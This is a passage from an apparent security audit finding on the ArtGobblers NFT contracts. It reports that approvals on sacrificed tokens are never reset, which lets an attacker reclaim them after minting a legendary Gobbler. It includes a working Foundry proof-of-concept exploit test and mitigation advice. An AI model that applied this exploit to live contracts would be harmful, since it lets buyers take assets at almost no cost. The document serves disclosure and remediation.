This is achieved by "reviving" sacrificed Gobblers after having called `mintLegendaryGobbler`.  ## Severity Justification This vulnerability allows the violation of the fundamental mechanics of in-scope contracts, allowing buyers to purchase legendary Gobblers at almost no cost outside of temporary liquidity requirements which can be reduced via the use of NFT flashloans.  ## Proof of Concept (PoC): Add the following code to the `ArtGobblersTest` contract in  `test/ArtGobblers.t.sol`  and run the test via `forge test --match-test testCanReuseSacrificedGobblers  -vvv`: ```solidity function testCanReuseSacrificedGobblers() public {  address user = users[0];   // setup legendary mint  uint256 startTime = block.timestamp + 30 days;  vm.warp(startTime);  mintGobblerToAddress(user, gobblers.LEGENDARY_AUCTION_INTERVAL());  uint256 cost = gobblers.legendaryGobblerPrice();  assertEq(cost, 69);  setRandomnessAndReveal(cost, "seed");   for (uint256 curId = 1; curId <= cost; curId++) {   ids.push(curId);   assertEq(gobblers.ownerOf(curId), users[0]);  }   // do token approvals for vulnerability exploit  vm.startPrank(user);  for (uint256 i = 0; i < ids.length; i++) {   gobblers.approve(user, ids[i]);  }  vm.stopPrank();   // mint legendary  vm.prank(user);  uint256 mintedLegendaryId = gobblers.mintLegendaryGobbler(ids);   // confirm user owns legendary  assertEq(gobblers.ownerOf(mintedLegendaryId), user);   // show that contract initially thinks tokens are burnt  for (uint256 i = 0; i < ids.length; i++) {   hevm.expectRevert("NOT_MINTED");   gobblers.ownerOf(ids[i]);  }   // "revive" burnt tokens by transferring from zero address with approval  // which was not reset  vm.startPrank(user);  for (uint256 i = 0; i < ids.length; i++) {   gobblers.transferFrom(address(0), user, ids[i]);   assertEq(gobblers.ownerOf(ids[i]), user);  }  vm.stopPrank(); } ```  ## Tools Used Manual review.  ## Recommended Mitigation Steps Ensure token ownership is reset in the for-loop of the `mintLegendaryGobbler` method. Alternatively to reduce the gas cost of `mintLegendaryGobbler` by saving on the approval deletion, simply check the `from` address in `transferFrom`, revert if it's `address(0)`. Note that the latter version would also require changing the `getApproved` view method such that it checks the owner of the token and returns the zero-address if the owner is zero, otherwise the `getApproved` method would return the old owner after the underlying Gobbler was sacrificed.
